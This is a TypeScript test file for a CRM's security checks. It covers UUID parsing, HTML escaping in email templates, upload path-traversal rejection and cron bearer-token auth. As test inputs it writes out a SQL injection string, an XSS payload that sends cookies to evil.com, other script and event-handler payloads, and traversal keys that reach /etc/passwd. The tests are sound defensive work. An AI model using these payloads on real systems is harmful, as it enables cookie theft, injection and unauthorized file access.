/**
 * Security integration tests for Propi CRM.
 *
 * Verifies that security boundaries are enforced correctly:
 * - parseUuid rejects malformed IDs at server action boundaries
 * - escapeHtml prevents HTML injection in email templates
 * - Upload key validation rejects path traversal
 * - Cron auth validation rejects unauthenticated requests
 *
 * All tests are pure logic tests — no mocks, no infrastructure required.
 */

import { describe, it, expect } from "vitest";
import { parseUuid } from "@/lib/validators";
import { escapeHtml } from "@/lib/sanitize";

// ---------------------------------------------------------------------------
// parseUuid - boundary validation for route parameters
// ---------------------------------------------------------------------------

describe("parseUuid", () => {
  it("accepts a valid UUID v4", () => {
    const uuid = "550e8400-e29b-41d4-a716-446655440000";
    expect(parseUuid(uuid)).toBe(uuid);
  });

  it("rejects an empty string", () => {
    expect(() => parseUuid("")).toThrow("ID invalido.");
  });

  it("rejects a non-UUID string", () => {
    expect(() => parseUuid("not-a-uuid")).toThrow("ID invalido.");
  });

  it("rejects a partial UUID", () => {
    expect(() => parseUuid("550e8400-e29b-41d4")).toThrow("ID invalido.");
  });

  it("rejects SQL injection attempts", () => {
    expect(() => parseUuid("'; DROP TABLE contacts; --")).toThrow(
      "ID invalido.",
    );
  });

  it("uses custom label in error message", () => {
    expect(() => parseUuid("bad", "Property ID")).toThrow(
      "Property ID invalido.",
    );
  });

  it("rejects UUID with extra characters appended", () => {
    expect(() =>
      parseUuid("550e8400-e29b-41d4-a716-446655440000-extra"),
    ).toThrow("ID invalido.");
  });

  it("rejects numeric strings", () => {
    expect(() => parseUuid("12345")).toThrow("ID invalido.");
  });
});

// ---------------------------------------------------------------------------
// escapeHtml - email injection prevention
// ---------------------------------------------------------------------------

describe("escapeHtml - email injection scenarios", () => {
  it("neutralizes script tags in property descriptions", () => {
    const malicious =
      '<script>document.location="https://evil.com/steal?c="+document.cookie</script>';
    const escaped = escapeHtml(malicious);
    expect(escaped).not.toContain("<script>");
    expect(escaped).not.toContain("</script>");
    expect(escaped).toContain("&lt;script&gt;");
  });

  it("neutralizes img onerror XSS", () => {
    const malicious = '<img src=x onerror="alert(1)">';
    const escaped = escapeHtml(malicious);
    expect(escaped).not.toContain("<img");
    expect(escaped).toContain("&lt;img");
  });

  it("neutralizes anchor tag phishing", () => {
    const malicious =
      '<a href="https://evil.com/login">Click aqui para verificar tu cuenta</a>';
    const escaped = escapeHtml(malicious);
    expect(escaped).not.toContain("<a ");
    expect(escaped).toContain("&lt;a");
  });

  it("neutralizes style injection for content hiding", () => {
    const malicious =
      '<style>body{display:none}</style><div>Fake content</div>';
    const escaped = escapeHtml(malicious);
    expect(escaped).not.toContain("<style>");
    expect(escaped).not.toContain("<div>");
  });

  it("neutralizes event handler injection", () => {
    const malicious = '<div onmouseover="fetch(\'https://evil.com\')">hover me</div>';
    const escaped = escapeHtml(malicious);
    expect(escaped).not.toContain("<div");
    expect(escaped).toContain("&lt;div");
  });

  it("preserves legitimate property descriptions unchanged", () => {
    const legitimate =
      "Hermoso apartamento de 120m2 en Altamira. 3 habitaciones, 2 banos. Precio: $150,000";
    expect(escapeHtml(legitimate)).toBe(legitimate);
  });

  it("escapes ampersands in legitimate text", () => {
    const withAmpersand = "Cocina & sala integradas. Piso 5/12.";
    expect(escapeHtml(withAmpersand)).toBe(
      "Cocina &amp; sala integradas. Piso 5/12.",
    );
  });
});

// ---------------------------------------------------------------------------
// Upload key validation - path traversal prevention
// ---------------------------------------------------------------------------

describe("upload key validation", () => {
  /**
   * Replicates the validation rules from /api/upload/route.ts.
   * Tests the logic independently of the HTTP handler.
   */
  function validateUploadKey(key: string, userId: string): string | null {
    if (!key.startsWith(`${userId}/`)) return "Invalid key prefix";
    if (key.includes("..") || key.includes("\0")) return "Invalid key";
    return null;
  }

  it("accepts a valid key with userId prefix", () => {
    expect(
      validateUploadKey("user_123/properties/abc/photo.jpg", "user_123"),
    ).toBeNull();
  });

  it("accepts nested paths within user directory", () => {
    expect(
      validateUploadKey(
        "user_123/documents/2024/01/contract.pdf",
        "user_123",
      ),
    ).toBeNull();
  });

  it("rejects key without userId prefix", () => {
    expect(
      validateUploadKey("other_user/properties/abc/photo.jpg", "user_123"),
    ).toBe("Invalid key prefix");
  });

  it("rejects path traversal with ..", () => {
    expect(
      validateUploadKey("user_123/../other_user/secret.pdf", "user_123"),
    ).toBe("Invalid key");
  });

  it("rejects null bytes (bypass attempt)", () => {
    expect(validateUploadKey("user_123/file\0.jpg", "user_123")).toBe(
      "Invalid key",
    );
  });

  it("rejects empty key", () => {
    expect(validateUploadKey("", "user_123")).toBe("Invalid key prefix");
  });

  it("rejects key that starts with userId but has traversal deeper", () => {
    expect(
      validateUploadKey("user_123/../../etc/passwd", "user_123"),
    ).toBe("Invalid key");
  });

  it("rejects key where userId is a prefix of another user", () => {
    // "user_12" should not match "user_123/" prefix
    expect(
      validateUploadKey("user_12/properties/photo.jpg", "user_123"),
    ).toBe("Invalid key prefix");
  });
});

// ---------------------------------------------------------------------------
// Cron auth validation - endpoint protection
// ---------------------------------------------------------------------------

describe("cron endpoint auth validation", () => {
  /**
   * Replicates the auth check from /api/cron/* routes.
   */
  function validateCronAuth(
    authHeader: string | null,
    cronSecret: string | undefined,
  ): { status: number; error?: string } {
    if (!cronSecret)
      return { status: 500, error: "CRON_SECRET not configured" };
    if (authHeader !== `Bearer ${cronSecret}`)
      return { status: 401, error: "Unauthorized" };
    return { status: 200 };
  }

  it("rejects when CRON_SECRET is not configured", () => {
    const result = validateCronAuth("Bearer abc", undefined);
    expect(result.status).toBe(500);
    expect(result.error).toBe("CRON_SECRET not configured");
  });

  it("rejects when no auth header is provided", () => {
    const result = validateCronAuth(null, "my-secret");
    expect(result.status).toBe(401);
  });

  it("rejects when auth header has wrong token", () => {
    const result = validateCronAuth("Bearer wrong-token", "my-secret");
    expect(result.status).toBe(401);
  });

  it("rejects when auth header uses wrong scheme", () => {
    const result = validateCronAuth("Basic my-secret", "my-secret");
    expect(result.status).toBe(401);
  });

  it("accepts correct Bearer token", () => {
    const result = validateCronAuth("Bearer my-secret", "my-secret");
    expect(result.status).toBe(200);
  });

  it("rejects token with extra whitespace (timing attack prevention)", () => {
    const result = validateCronAuth("Bearer  my-secret", "my-secret");
    expect(result.status).toBe(401);
  });

  it("rejects empty CRON_SECRET (misconfiguration)", () => {
    const result = validateCronAuth("Bearer ", "");
    expect(result.status).toBe(500);
  });
});
